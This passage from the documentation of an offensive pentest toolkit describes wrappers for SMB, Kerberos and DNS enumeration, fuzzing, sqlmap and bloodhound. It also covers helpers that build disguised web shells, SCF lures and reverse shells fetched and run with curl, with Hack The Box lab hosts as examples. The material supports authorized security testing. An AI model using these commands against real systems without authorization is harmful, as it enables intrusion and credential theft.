<ol start="3" type="1">
<li>If <code>line</code> is not provided:</li>
</ol>
<ul>
<li>Lists available SMB shares on the remote host with the command:
<code>smbclient -N -L \\{rhost}</code></li>
</ul>
<ol start="4" type="1">
<li>Suggests a potential SMB exploit if possible by mounting the share
from the local host using:
<code>mount -t cifs "//{lhost}/share" /mnt/smb</code></li>
</ol>
<p>:param line: The name of the SMB share to access on the remote host.
If not provided, the function will list all available shares. :returns:
None</p>
<h2 id="smbmap">smbmap</h2>
<p>smbmap -H 10.10.10.3 [OPTIONS] Uses the <code>smbmap</code> tool to
interact with SMB shares on a remote host:</p>
<ol type="1">
<li>Checks if <code>rhost</code> (remote host) and <code>lhost</code>
(local host) are set; if not, an error message is displayed.</li>
<li>If no <code>line</code> (share name or options) is provided:</li>
</ol>
<ul>
<li>Attempts to access SMB shares on the remote host with a default user
<code>deefbeef</code> using the command:
<code>smbmap -H {rhost} -u 'deefbeef'</code></li>
</ul>
<ol start="3" type="1">
<li>If <code>line</code> is provided:</li>
</ol>
<ul>
<li>Executes <code>smbmap</code> with the specified options or share
name using the command: <code>smbmap -H {rhost} -R {line}</code></li>
</ul>
<ol start="4" type="1">
<li>Suggests a potential SMB exploit if possible by mounting the share
from the local host using:
<code>mount -t cifs "//{lhost}/documents" /mnt/smb</code></li>
</ol>
<p>:param line: Options or share name to use with <code>smbmap</code>.
If not provided, uses a default user to list shares. :returns: None</p>
<h2 id="getnpusers">getnpusers</h2>
<p>sudo impacket-GetNPUsers mist.htb/ -no-pass -usersfile
sessions/users.txt Executes the <code>impacket-GetNPUsers</code> command
to enumerate users with Kerberos pre-authentication disabled.</p>
<ol type="1">
<li>Checks if the <code>line</code> (domain) argument is provided; if
not, an error message is displayed, instructing the user to provide a
domain.</li>
<li>Executes <code>impacket-GetNPUsers</code> with the following
options:</li>
</ol>
<ul>
<li><code>-no-pass</code>: Skips password prompt.</li>
<li><code>-usersfile sessions/users.txt</code>: Specifies the file
containing the list of users to check.</li>
</ul>
<p>:param line: The domain to query. Must be provided in the format
<code>domain.com</code>. Example usage:
<code>getnpusers domain.com</code> :returns: None</p>
<p>Manual execution: To manually run this command, use the following
syntax: sudo impacket-GetNPUsers <domain> -no-pass -usersfile
sessions/users.txt Replace <code>&lt;domain&gt;</code> with the actual
domain name you want to query.</p>
<h2 id="psexec">psexec</h2>
<p>Copies the <code>rhost</code> IP address to the clipboard and updates
the prompt with the IP address.</p>
<ol type="1">
<li>Retrieves the <code>rhost</code> IP address from the
<code>self.params</code> parameter.</li>
<li>Checks if the <code>rhost</code> is valid using
<code>check_rhost()</code>. If invalid, the function returns without
making changes.</li>
<li>If <code>line</code> is ‘clean’, resets the custom prompt to its
original state.</li>
<li>Otherwise, updates the prompt to include the <code>rhost</code> IP
address in the specified format.</li>
<li>Copies the <code>rhost</code> IP address to the clipboard using
<code>xclip</code>.</li>
<li>Prints a message confirming that the IP address has been copied to
the clipboard.</li>
</ol>
<p>:param line: This parameter determines whether the prompt should be
reset or updated with the IP address. :type line: str :returns: None</p>
<p>Manual execution: To manually run this command, use the following
syntax: rhost <line> Replace <code>&lt;line&gt;</code> with ‘clean’ to
reset the prompt, or any other string to update the prompt with the IP
address.</p>
<h2 id="rpcdump">rpcdump</h2>
<p>Executes the <code>rpcdump.py</code> script to dump RPC services from
a target host.</p>
<ol type="1">
<li>Retrieves the target host IP from the <code>rhost</code>
parameter.</li>
<li>Checks if the <code>rhost</code> parameter is valid using
<code>check_rhost()</code>. If invalid, the function returns early.</li>
<li>Executes the <code>rpcdump.py</code> script on port 135 and 593 to
gather RPC service information from the target host.</li>
</ol>
<p>:param line: This parameter is not used in this command but is
included for consistency with other methods. :returns: None</p>
<p>Manual execution: To manually run this command, use the following
syntax: rpcdump.py -p 135 <target_host> rpcdump.py -p 593 <target_host>
Replace <code>&lt;target_host&gt;</code> with the IP address or hostname
of the target machine.</p>
<h2 id="dig">dig</h2>
<p>Executes the <code>dig</code> command to query DNS information.</p>
<ol type="1">
<li>Retrieves the DNS server IP from the <code>line</code> parameter and
the target host from the <code>rhost</code> parameter.</li>
<li>If either the DNS server or <code>rhost</code> is not provided, an
error message is printed.</li>
<li>Executes the <code>dig</code> command to query the version of the
DNS server and additional records.</li>
</ol>
<p>:param line: DNS server IP or hostname. Must be provided for the
<code>dig</code> command. :param rhost: Target host for additional
<code>dig</code> queries.</p>
<p>:returns: None</p>
<p>Manual execution: To manually run these commands, use the following
syntax: dig version.bind CHAOS TXT @<dns_server> dig any <domain>
@<rhost></p>
<p>Replace <code>&lt;dns_server&gt;</code> with the IP address or
hostname of the DNS server, <code>&lt;domain&gt;</code> with the target
domain, and <code>&lt;rhost&gt;</code> with the IP address or hostname
of the target machine.</p>
<h2 id="cp">cp</h2>
<p>Copies a file from the ExploitDB directory to the sessions
directory.</p>
<ol type="1">
<li>Retrieves the path to the ExploitDB directory and the target file
from the <code>line</code> parameter.</li>
<li>Copies the specified file from the ExploitDB directory to the
<code>sessions</code> directory in the current working directory.</li>
</ol>
<p>:param line: The relative path to the file within the ExploitDB
directory. For example, <code>java/remote/51884.py</code>. :param
exploitdb: The path to the ExploitDB directory. This must be set in
advance or provided directly.</p>
<p>:returns: None</p>
<p>Manual execution: To manually copy files, use the following syntax:
cp <exploitdb_path><file_path> <destination_path></p>
<p>Replace <code>&lt;exploitdb_path&gt;</code> with the path to your
ExploitDB directory, <code>&lt;file_path&gt;</code> with the relative
path to the file, and <code>&lt;destination_path&gt;</code> with the
path where you want to copy the file.</p>
<p>For example: cp /usr/share/exploitdb/exploits/java/remote/51884.py
/path/to/sessions/</p>
<h2 id="dnsenum">dnsenum</h2>
<p>Performs DNS enumeration using <code>dnsenum</code> to identify
subdomains for a given domain.</p>
<ol type="1">
<li>Executes the <code>dnsenum</code> command with parameters to specify
the DNS server, output file, and wordlist for enumeration.</li>
</ol>
<p>:param line: The target domain to perform DNS enumeration on, e.g.,
<code>ghost.htb</code>. :param rhost: The DNS server to use for
enumeration, e.g., <code>10.10.11.24</code>. :param dnswordlist: The
path to the DNS wordlist file used for subdomain discovery.</p>
<p>:returns: None</p>
<p>Manual execution: To manually perform DNS enumeration, use the
following command: dnsenum –dnsserver <dns_server> –enum -p 0 -s 0 -o
<output_file> -f <dns_wordlist> <target_domain></p>
<p>Replace <code>&lt;dns_server&gt;</code> with the DNS server IP,
<code>&lt;output_file&gt;</code> with the file path to save the results,
<code>&lt;dns_wordlist&gt;</code> with the path to your DNS wordlist
file, and <code>&lt;target_domain&gt;</code> with the domain to be
enumerated.</p>
<p>For example: dnsenum –dnsserver 10.10.11.24 –enum -p 0 -s 0 -o
sessions/subdomains.txt -f /path/to/dnswordlist.txt ghost.htb</p>
<h2 id="dnsmap">dnsmap</h2>
<p>Performs DNS enumeration using <code>dnsmap</code> to discover
subdomains for a specified domain.</p>
<ol type="1">
<li>Executes the <code>dnsmap</code> command to scan the given domain
with a specified wordlist.</li>
</ol>
<p>:param line: The target domain to perform DNS enumeration on, e.g.,
<code>ghost.htb</code>. :param dnswordlist: The path to the wordlist
file used for DNS enumeration.</p>
<p>:returns: None</p>
<p>Manual execution: To manually perform DNS enumeration, use the
following command: dnsmap <target_domain> -w <dns_wordlist></p>
<p>Replace <code>&lt;target_domain&gt;</code> with the domain you want
to scan and <code>&lt;dns_wordlist&gt;</code> with the path to your DNS
wordlist file.</p>
<p>For example: dnsmap ghost.htb -w /path/to/dnswordlist.txt</p>
<h2 id="whatweb">whatweb</h2>
<p>Performs a web technology fingerprinting scan using
<code>whatweb</code>.</p>
<ol type="1">
<li>Executes the <code>whatweb</code> command to identify technologies
used by the target web application.</li>
</ol>
<p>:param line: This parameter is not used in the current implementation
but could be used to pass additional options or arguments if needed.
:param rhost: The target web host to be scanned, specified in the
<code>params</code> dictionary.</p>
<p>:returns: None</p>
<p>Manual execution: To manually perform web technology fingerprinting,
use the following command: whatweb <target_host></p>
<p>Replace <code>&lt;target_host&gt;</code> with the URL or IP address
of the web application you want to scan.</p>
<p>For example: whatweb example.com</p>
<h2 id="enum4linux">enum4linux</h2>
<p>Performs enumeration of information from a target Linux/Unix system
using <code>enum4linux</code>.</p>
<ol type="1">
<li>Executes the <code>enum4linux</code> command with the
<code>-a</code> option to gather extensive information from the
specified target.</li>
</ol>
<p>:param line: This parameter is not used in the current implementation
but could be used to pass additional options or arguments if needed.
:param rhost: The target host for enumeration, specified in the
<code>params</code> dictionary.</p>
<p>:returns: None</p>
<p>Manual execution: To manually enumerate information from a Linux/Unix
system, use the following command: enum4linux -a <target_host></p>
<p>Replace <code>&lt;target_host&gt;</code> with the IP address or
hostname of the target system.</p>
<p>For example: enum4linux -a 192.168.1.10</p>
<h2 id="nbtscan">nbtscan</h2>
<p>Performs network scanning using <code>nbtscan</code> to discover
NetBIOS names and addresses in a specified range.</p>
<ol type="1">
<li>Executes the <code>nbtscan</code> command with the <code>-r</code>
option to scan the specified range of IP addresses for NetBIOS
information.</li>
</ol>
<p>:param line: This parameter is not used in the current implementation
but could be used to specify additional options or arguments if needed.
:param rhost: The target network range for scanning, specified in the
<code>params</code> dictionary.</p>
<p>:returns: None</p>
<p>Manual execution: To manually perform a NetBIOS scan across a network
range, use the following command: sudo nbtscan -r <network_range></p>
<p>Replace <code>&lt;network_range&gt;</code> with the IP address range
you want to scan. For example: sudo nbtscan -r 192.168.1.0/24</p>
<h2 id="rpcclient">rpcclient</h2>
<p>Executes the <code>rpcclient</code> command to interact with a remote
Windows system over RPC (Remote Procedure Call) using anonymous
credentials.</p>
<ol type="1">
<li>Runs <code>rpcclient</code> with the <code>-U ''</code> (empty
username) and <code>-N</code> (no password) options to connect to the
target host specified by <code>rhost</code>.</li>
</ol>
<p>:param line: This parameter is not used in the current implementation
but could be used to specify additional options or arguments if needed.
:param rhost: The IP address of the remote host to connect to, specified
in the <code>params</code> dictionary.</p>
<p>:returns: None</p>
<p>Manual execution: To manually interact with a remote Windows system
using RPC, use the following command: rpcclient -U ’’ -N <target_ip></p>
<p>Replace <code>&lt;target_ip&gt;</code> with the IP address of the
target system. For example: rpcclient -U ’’ -N 10.10.10.10</p>
<h2 id="nikto">nikto</h2>
<p>Runs the <code>nikto</code> tool to perform a web server
vulnerability scan against the specified target host.</p>
<ol type="1">
<li>Executes <code>nikto</code> with the <code>-h</code> option to
specify the target host IP address.</li>
</ol>
<p>:param line: This parameter is not used in the current implementation
but could be used to specify additional options or arguments if needed.
:param rhost: The IP address of the target web server, specified in the
<code>params</code> dictionary.</p>
<p>:returns: None</p>
<p>Manual execution: To manually perform a web server vulnerability scan
using <code>nikto</code>, use the following command: nikto -h
<target_ip></p>
<p>Replace <code>&lt;target_ip&gt;</code> with the IP address of the
target web server. For example: nikto -h 10.10.10.10</p>
<h2 id="openssl_sclient">openssl_sclient</h2>
<p>Uses <code>openssl s_client</code> to connect to a specified host and
port, allowing for testing and debugging of SSL/TLS connections.</p>
<p>:param line: The port number to connect to on the target host. This
must be provided as an argument. :param rhost: The IP address or
hostname of the target server, specified in the <code>params</code>
dictionary.</p>
<p>:returns: None</p>
<p>Manual execution: To manually connect to a server using
<code>openssl s_client</code> and test SSL/TLS, use the following
command: openssl s_client -connect <target_ip>:<port></p>
<p>Replace <code>&lt;target_ip&gt;</code> with the IP address or
hostname of the target server and <code>&lt;port&gt;</code> with the
port number. For example: openssl s_client -connect 10.10.10.10:443</p>
<h2 id="ss">ss</h2>
<p>Uses <code>searchsploit</code> to search for exploits in the Exploit
Database based on the provided search term.</p>
<p>:param line: The search term or query to find relevant exploits. This
must be provided as an argument.</p>
<p>:returns: None</p>
<p>Manual execution: To manually search for exploits using
<code>searchsploit</code>, use the following command: searchsploit
<search_term></p>
<p>Replace <code>&lt;search_term&gt;</code> with the term or keyword you
want to search for. For example: searchsploit kernel</p>
<h2 id="wfuzz">wfuzz</h2>
<p>Uses <code>wfuzz</code> to perform fuzzing based on provided
parameters. This function supports various options for directory and
file fuzzing.</p>
<p>:param line: The options and arguments for <code>wfuzz</code>. The
<code>line</code> parameter can include the following: -
<code>sub &lt;domain&gt;</code>: Fuzz DNS subdomains. Requires
<code>dnswordlist</code> to be set. - <code>iis</code>: Fuzz IIS
directories. Uses a default wordlist if <code>iiswordlist</code> is not
set. - Any other argument: General directory and file fuzzing.</p>
<p>:returns: None</p>
<p>Manual execution: To manually use <code>wfuzz</code> for directory
and file fuzzing, use the following commands:</p>
<ol type="1">
<li>For fuzzing DNS subdomains: wfuzz -c <extra_options> -t <threads> -w
<wordlist> -H ‘Host: FUZZ.<domain>’ <domain></li>
</ol>
<p>Example: wfuzz -c –hl=7 -t 200 -w /path/to/dnswordlist -H ‘Host:
FUZZ.example.com’ example.com</p>
<ol start="2" type="1">
<li>For fuzzing IIS directories: wfuzz -c <extra_options> -t <threads>
-w /path/to/iiswordlist http://<rhost>/FUZZ</li>
</ol>
<p>Example: wfuzz -c –hl=7 -t 200 -w
/usr/share/wordlists/SecLists-master/Discovery/Web-Content/IIS.fuzz.txt
http://10.10.10.10/FUZZ</p>
<ol start="3" type="1">
<li>For general directory and file fuzzing: wfuzz -c <extra_options> -t
<threads> -w <wordlist> http://<rhost>/FUZZ</li>
</ol>
<p>Example: wfuzz -c –hl=7 -t 200 -w /path/to/dirwordlist
http://10.10.10.10/FUZZ</p>
<h2 id="launchpad">launchpad</h2>
<p>Searches for packages on Launchpad based on the provided search term
and extracts codenames from the results. The distribution is extracted
from the search term.</p>
<p>:param line: The search term to be used for querying Launchpad. The
<code>line</code> parameter should be a string containing the search
term, e.g., “8.2p1 Ubuntu 4ubuntu0.11”.</p>
<p>:returns: None</p>
<p>Manual execution: To manually execute the equivalent command, use the
following steps:</p>
<ol type="1">
<li>Extract the distribution from the search term:</li>
</ol>
<ul>
<li>This function assumes the distribution name is part of the search
term and is used to build the URL.</li>
</ul>
<ol start="2" type="1">
<li>URL encode the search term:</li>
</ol>
<ul>
<li>Replace spaces with <code>%20</code> to form the encoded search
query.</li>
</ul>
<ol start="3" type="1">
<li>Use <code>curl</code> to perform the search and filter results: curl
-s “https://launchpad.net/+search?field.text=<encoded_search_term>” |
grep ‘href’ | grep ‘<distribution>’ | grep -oP
‘(?&lt;=href=“https://launchpad.net/<distribution>/)[^/"]+’ | sort
-u</li>
</ol>
<p>Example: If the search term is “8.2p1 Ubuntu 4ubuntu0.11”, the
command would be: curl -s
“https://launchpad.net/+search?field.text=8.2p1%20Ubuntu%204ubuntu0.11”
| grep ‘href’ | grep ‘ubuntu’ | grep -oP
‘(?&lt;=href=“https://launchpad.net/ubuntu/)[^/"]+’ | sort -u</p>
<p>Notes: - Ensure that <code>curl</code> is installed and accessible in
your environment. - The extracted codenames are printed to the
console.</p>
<h2 id="gobuster">gobuster</h2>
<p>Uses <code>gobuster</code> for directory and virtual host fuzzing
based on provided parameters. Supports directory enumeration and virtual
host discovery.</p>
<p>:param line: The options and arguments for <code>gobuster</code>. The
<code>line</code> parameter can include the following: -
<code>url</code>: Perform directory fuzzing on a specified URL. Requires
<code>url</code> and <code>dirwordlist</code> to be set. -
<code>vhost</code>: Perform virtual host discovery on a specified URL.
Requires <code>url</code> and <code>dirwordlist</code> to be set. - Any
other argument: General directory fuzzing with additional
parameters.</p>
<p>:returns: None</p>
<p>Manual execution: To manually use <code>gobuster</code>, use the
following commands:</p>
<ol type="1">
<li>For directory fuzzing: gobuster dir –url <url>/ –wordlist
<wordlist></li>
</ol>
<p>Example: gobuster dir –url http://example.com/ –wordlist
/path/to/dirwordlist</p>
<ol start="2" type="1">
<li>For virtual host discovery: gobuster vhost –append-domain -u <url>
-w <wordlist> –random-agent -t 600</li>
</ol>
<p>Example: gobuster vhost –append-domain -u http://example.com -w
/path/to/dirwordlist –random-agent -t 600</p>
<ol start="3" type="1">
<li>For general directory fuzzing with additional parameters: gobuster
dir –url http://<rhost>/ –wordlist <wordlist>
<additional_parameters></li>
</ol>
<p>Example: gobuster dir –url http://10.10.10.10/ –wordlist
/path/to/dirwordlist -x .php,.html</p>
<h2 id="addhosts">addhosts</h2>
<p>Adds an entry to the <code>/etc/hosts</code> file, mapping an IP
address to a domain name.</p>
<p>:param line: The domain name to be added to the
<code>/etc/hosts</code> file. - Example: <code>permx.htb</code></p>
<p>:returns: None</p>
<p>Manual execution: To manually add a domain to the
<code>/etc/hosts</code> file, use the following command:</p>
<pre><code>sudo sh -c -e &quot;echo &#39;&lt;rhost&gt; &lt;domain&gt;&#39; &gt;&gt; /etc/hosts&quot;</code></pre>
<p>Example: sudo sh -c -e “echo ‘10.10.11.23 permx.htb’ &gt;&gt;
/etc/hosts”</p>
<p>This command appends the IP address and domain name to the
<code>/etc/hosts</code> file, enabling local resolution of the
domain.</p>
<h2 id="cme">cme</h2>
<p>Performs an SMB enumeration using <code>crackmapexec</code>.</p>
<p>:param line: Not used in this function.</p>
<p>:returns: None</p>
<p>Manual execution: To manually run <code>crackmapexec</code> for SMB
enumeration, use the following command:</p>
<pre><code>crackmapexec smb &lt;target&gt;</code></pre>
<p>Example: crackmapexec smb 10.10.11.24</p>
<p>This command will enumerate SMB shares and perform basic SMB checks
against the specified target IP address.</p>
<h2 id="ldapdomaindump">ldapdomaindump</h2>
<p>Dumps LDAP information using <code>ldapdomaindump</code> with
credentials from a file.</p>
<p>:param line: The domain to use for authentication (e.g.,
‘domain.local’).</p>
<p>:returns: None</p>
<p>Manual execution: To manually run <code>ldapdomaindump</code> for
LDAP enumeration, use the following command:</p>
<pre><code>ldapdomaindump -u &#39;&lt;domain&gt;\&lt;username&gt;&#39; -p &#39;&lt;password&gt;&#39; &lt;target&gt;</code></pre>
<p>Example: ldapdomaindump -u ‘domain.local’ -p ‘passadmin123’
10.10.11.23</p>
<p>Ensure you have a file <code>sessions/credentials.txt</code> in the
format <code>user:password</code>, where each line contains credentials
for the LDAP enumeration.</p>
<h2 id="bloodhound">bloodhound</h2>
<p>Perform LDAP enumeration using bloodhound-python with credentials
from a file.</p>
<p>:param line: This parameter is not used in the function but could be
used for additional options or domain information.</p>
<p>:returns: None</p>
<p>Manual execution: To manually run <code>bloodhound-python</code> for
LDAP enumeration, use the following command:</p>
<pre><code>bloodhound-python -c All -u &#39;&lt;username&gt;&#39; -p &#39;&lt;password&gt;&#39; -ns &lt;target&gt;</code></pre>
<p>Example: bloodhound-python -c All -u ‘usuario’ -p ‘password’ -ns
10.10.10.10</p>
<p>Ensure you have a file <code>sessions/credentials.txt</code> with the
format <code>user:password</code>, where each line contains credentials
for enumeration.</p>
<h2 id="ping">ping</h2>
<p>Perform a ping to check host availability and infer the operating
system based on TTL values.</p>
<p>:param line: This parameter is not used in the function but could be
used for additional options or settings.</p>
<p>:returns: None</p>
<p>Manual execution: To manually ping a host and determine its operating
system, use the following command:</p>
<pre><code>ping -c 1 &lt;target&gt;</code></pre>
<p>Example: ping -c 1 10.10.10.10</p>
<p>The TTL (Time To Live) value is used to infer the operating system: -
TTL values around 64 typically indicate a Linux system. - TTL values
around 128 typically indicate a Windows system.</p>
<p>Ensure you have set <code>rhost</code> to the target host for the
command to work.</p>
<h2 id="gospider">gospider</h2>
<p>Try gospider for web spidering.</p>
<p>This function executes the <code>gospider</code> tool to perform web
spidering. It can either use a URL provided as a parameter or the remote
host defined in <code>self.params</code>.</p>
<p>Usage: gospider url gospider</p>
<p>:param line: Command parameter that determines the execution mode.
Use “url” to specify a URL, or leave empty to use the remote host. :type
line: str</p>
<ul>
<li>If <code>line</code> is “url”, the method uses the URL specified in
<code>self.params["url"]</code>.</li>
<li>If <code>line</code> is not “url”, the method uses the remote host
specified in <code>self.params["rhost"]</code>.</li>
</ul>
<p>:returns: None</p>
<p>Manual execution: 1. Ensure that the <code>gospider</code> tool is
installed on the system. 2. Set the <code>url</code> parameter if using
the “url” mode. 3. Run the method to perform the spidering
operation.</p>
<p>Dependencies: - <code>gospider</code> must be installed on the
system. - The <code>sudo</code> command must be available for installing
<code>gospider</code>.</p>
<p>Examples: 1. To scan a specific URL: <code>gospider url</code> 2. To
scan the remote host: <code>gospider</code></p>
<p>Note: - If <code>gospider</code> is not installed, the method will
attempt to install it. - Ensure that the network and tools are
configured correctly for successful execution.</p>
<h2 id="arpscan">arpscan</h2>
<p>Executes an ARP scan using <code>arp-scan</code>.</p>
<p>This function performs an ARP scan on the local network using the
<code>arp-scan</code> tool. The network device to be used for scanning
must be specified.</p>
<p>Usage: arpscan</p>
<p>:param line: Command parameters (not used in this function). :type
line: str</p>
<ul>
<li>Executes the <code>arp-scan</code> command with the specified
network device.</li>
</ul>
<p>:returns: None</p>
<p>Manual execution: 1. Ensure that the network device is set using the
appropriate parameter. 2. Run the method to perform an ARP scan.</p>
<p>Dependencies: - <code>arp-scan</code> must be installed on the
system. - The <code>sudo</code> command must be available for executing
<code>arp-scan</code>.</p>
<p>Examples: 1. Set the device parameter using
<code>set device &lt;network_device&gt;</code>. 2. Run
<code>arpscan</code> to perform the ARP scan.</p>
<p>Note: - The network device must be configured and available on the
system for the scan to work. - Ensure that <code>arp-scan</code> is
installed and accessible from the command line.</p>
<h2 id="lazypwn">lazypwn</h2>
<p>Executes the LazyPwn script.</p>
<p>This function runs the <code>lazypwn.py</code> script located in the
<code>modules</code> directory. The script is typically used for
automated exploitation or security testing tasks within the LazyOwn
framework.</p>
<p>Usage: lazypwn</p>
<p>:param line: Command parameters (not used in this function). :type
line: str</p>
<ul>
<li>Executes the <code>lazypwn.py</code> script with Python 3.</li>
</ul>
<p>:returns: None</p>
<p>Manual execution: 1. Run the method to execute the LazyPwn
script.</p>
<p>Dependencies: - The <code>lazypwn.py</code> script must be present in
the <code>modules</code> directory. - Python 3 must be installed and
accessible from the command line.</p>
<p>Examples: 1. Run <code>do_lazypwn</code> to execute the LazyPwn
script.</p>
<p>Note: - Ensure that <code>lazypwn.py</code> is configured correctly
before running this method. - The script’s functionality depends on its
implementation in <code>modules/lazypwn.py</code>.</p>
<h2 id="fixel">fixel</h2>
<p>Fixes file permissions and line endings in the project
directories.</p>
<p>This function converts line endings from DOS/Windows format to Unix
format for all files in the project directories. This helps to ensure
consistent line endings and can prevent issues related to file format
mismatches.</p>
<p>Usage: fixel</p>
<p>:param line: Command parameters (not used in this function). :type
line: str</p>
<ul>
<li>Converts line endings for all files in the current directory
(<code>*</code>).</li>
<li>Converts line endings for all files in the <code>modules</code>
directory (<code>modules/*</code>).</li>
<li>Converts line endings for all files in the
<code>modules/cgi-bin</code> directory
(<code>modules/cgi-bin/*</code>).</li>
</ul>
<p>:returns: None</p>
<p>Manual execution: 1. Run the method to fix line endings in the
specified directories.</p>
<p>Dependencies: - The <code>dos2unix</code> command must be installed
and accessible from the command line.</p>
<p>Examples: 1. Run <code>do_fixel</code> to convert line endings for
all files in the project directories.</p>
<p>Note: - This method only fixes line endings and does not modify file
permissions. - Ensure that the <code>dos2unix</code> command is
installed and functioning correctly.</p>
<h2 id="smbserver">smbserver</h2>
<p>Sets up an SMB server using Impacket and creates an SCF file for SMB
share access.</p>
<p>This function configures an SMB server to serve files from the
<code>sessions</code> directory and generates an SCF file that points to
the SMB share. The SCF file can be used to create a shortcut to the SMB
share on a Windows system.</p>
<p>Usage: smbserver</p>
<p>:param line: Command parameters (not used in this function). :type
line: str</p>
<ul>
<li>Checks if <code>lhost</code> is valid using the
<code>check_lhost</code> function.</li>
<li>Creates an SCF file (<code>sessions/file.scf</code>) with
configuration to access the SMB share.</li>
<li>Copies a curl command to the clipboard for downloading the SCF file
from the SMB share.</li>
<li>Starts an SMB server using Impacket to serve the
<code>sessions</code> directory.</li>
</ul>
<p>:returns: None</p>
<p>Manual execution: 1. Ensure <code>lhost</code> is set to a valid IP
address or hostname. 2. Run the method to create the SCF file and start
the SMB server. 3. Use the copied curl command to download the SCF file
on the target system. 4. Ensure that <code>impacket-smbserver</code> is
installed and accessible from the command line.</p>
<p>Dependencies: - The <code>impacket-smbserver</code> tool must be
installed and accessible from the command line. - The
<code>check_lhost</code> function must validate the <code>lhost</code>
parameter.</p>
<p>Examples: 1. Run <code>do_smbserver</code> to set up the SMB server
and generate the SCF file. 2. Use the provided curl command to download
the SCF file on the target system.</p>
<p>Note: - The SCF file is used to create a shortcut to the SMB share
and should be accessible from the target system. - Ensure that the
<code>lhost</code> parameter is correctly set and that the SMB server is
properly configured.</p>
<h2 id="sqlmap">sqlmap</h2>
<p>Uses sqlmap to perform SQL injection testing on a given URL or
request file (you can get one with burpsuit or proxy command and
foxyproxy plugin for browser).</p>
<p>This function allows the execution of sqlmap commands with various
options, including testing URL endpoints, reading from request files,
and using sqlmap’s wizard mode for easy configuration.</p>
Usage: sqlmap req <request_file> <parameter> sqlmap req <request_file>
<parameter> <database> sqlmap req <request_file> <parameter> <database>
<table>
<p>sqlmap -wiz</p>
<p>:param line: Command parameters for sqlmap. :type line: str</p>
<ul>
<li><p>If <code>line</code> starts with <code>req</code>, it expects the
following formats:</p></li>
<li><p><code>req &lt;request_file&gt; &lt;parameter&gt;</code>: Tests
the specified parameter in the request file for SQL injection.</p></li>
<li><p><code>req &lt;request_file&gt; &lt;parameter&gt; &lt;database&gt;</code>:
Tests the specified parameter and attempts to dump tables from the
specified database.</p></li>
<li><p><code>req &lt;request_file&gt; &lt;parameter&gt; &lt;database&gt; &lt;table&gt;</code>:
Tests the specified parameter and attempts to dump data from the
specified table in the database.</p></li>
<li><p>If <code>line</code> starts with <code>-wiz</code>, it runs
sqlmap’s wizard mode for interactive configuration.</p></li>
<li><p>If <code>line</code> is empty, it uses the URL specified in
<code>self.params["url"]</code> to perform SQL injection testing with
sqlmap.</p></li>
</ul>
<p>:returns: None</p>
<p>Manual execution: 1. If using <code>req</code>, provide a valid
request file and parameters. 2. Run sqlmap with the specified options
for SQL injection testing. 3. To use the wizard mode, execute
<code>sqlmap -wizard</code>. 4. For URL-based testing, ensure
<code>url</code> is set and run sqlmap with the URL.</p>
<p>Dependencies: - The <code>sqlmap</code> tool must be installed and
accessible from the command line. - The request file specified in
<code>req</code> should be located in the <code>sessions</code>
directory.</p>
<p>Examples: sqlmap req requests.txt id sqlmap req requests.txt id
database_name sqlmap req requests.txt id database_name table_name sqlmap
-wiz</p>
<p>Note: - Ensure the request file exists and is readable before running
sqlmap. - The URL must be set for URL-based testing. - The wizard mode
is useful for interactive configuration if you’re unsure about the
options.</p>
<h2 id="proxy">proxy</h2>
<p>Runs a small proxy server to modify HTTP requests on the fly.</p>
<p>This function starts the <code>lazyproxy.py</code> script, which acts
as a proxy server for intercepting and modifying HTTP requests. The
server listens on port 8888.</p>
<p>Usage: proxy</p>
<p>:param line: This parameter is not used in the current
implementation. :type line: str :returns: None</p>
<p>Manual execution: 1. Executes the <code>lazyproxy.py</code> script to
start the proxy server. 2. The proxy server will run and modify requests
as configured in the script.</p>
<p>Dependencies: - The <code>lazyproxy.py</code> script must be
available in the <code>modules</code> directory.</p>
<p>Example: proxy</p>
<p>Note: - Ensure that the <code>lazyproxy.py</code> script is correctly
configured before running. - The proxy server will be accessible at
<code>http://localhost:8888</code>. - To stop the proxy server,
terminate the running process manually.</p>
<h2 id="createwebshell">createwebshell</h2>
<p>Creates a web shell disguised as a <code>.jpg</code> file in the
<code>sessions</code> directory.</p>
<p>This function performs the following actions: 1. Runs a Python script
<code>lazycreate_webshell.py</code> to create a disguised web shell. 2.
Downloads a PHP web shell from a specified URL and saves it to the
<code>sessions</code> directory.</p>
<p>Usage: createwebshell</p>
<p>:param line: This parameter is not used in the current
implementation. :type line: str :returns: None</p>
<p>Manual execution: 1. Executes the <code>lazycreate_webshell.py</code>
script to create a web shell disguised as a <code>.jpg</code> file. 2.
Downloads a PHP web shell from the GitHub repository and saves it to
<code>sessions</code>.</p>
<p>Dependencies: - <code>wget</code> must be installed for downloading
the web shell. - The <code>lazycreate_webshell.py</code> script must be
available in the <code>modules</code> directory.</p>
<p>Example: createwebshell</p>
<p>Note: - Ensure that the <code>lazycreate_webshell.py</code> script is
correctly configured and accessible. - Verify the URL in the
<code>wget</code> command to ensure it points to a valid and safe web
shell.</p>
<h2 id="createrevshell">createrevshell</h2>
<p>Creates a bash reverse shell script in the <code>sessions</code>
directory with the specified <code>lhost</code> and <code>lport</code>
values.</p>
<p>This function performs the following actions: 1. Checks if
<code>lhost</code> and <code>lport</code> are set. If not, it prints an
error message and exits. 2. Creates a bash reverse shell script using
the provided <code>lhost</code> and <code>lport</code> values. 3. Saves
the script to <code>sessions/revshell.sh</code>. 4. Prints a message
with the <code>curl</code> command to download and execute the reverse
shell script. 5. Copies the <code>curl</code> command to the
clipboard.</p>
<p>Usage: createrevshell</p>
<p>:param line: This parameter is not used in the current
implementation. :type line: str :returns: None</p>
<p>Manual execution: 1. Creates or overwrites the file
<code>sessions/revshell.sh</code> with the bash reverse shell script. 2.
Displays the command to download and execute the script via
<code>curl</code>. 3. Copies the <code>curl</code> command to the
clipboard for easy use.</p>
<p>Dependencies: - Bash must be installed on the target system. -
<code>xclip</code> must be installed for copying the command to the
clipboard.</p>
<p>Example: createrevshell</p>
<p>Note: - Ensure that <code>lhost</code> and <code>lport</code> are set
before running this command. - The script will listen for incoming
connections on the specified <code>lport</code> and connect back to
<code>lhost</code>. - Adjust the <code>lhost</code> and
<code>lport</code> as needed for your specific environment.</p>
<h2 id="createwinrevshell">createwinrevshell</h2>
<p>Creates a PowerShell reverse shell script in the
<code>sessions</code> directory with the specified <code>lhost</code>
and <code>lport</code> values.</p>
<p>This function performs the following actions: 1. Checks if
<code>lhost</code> and <code>lport</code> are set. If not, it prints an
error message and exits. 2. Creates a PowerShell reverse shell script
using the provided <code>lhost</code> and <code>lport</code> values. 3.
Saves the script to <code>sessions/revshell.ps1</code>. 4. Prints a
message with the command to download and execute the reverse shell
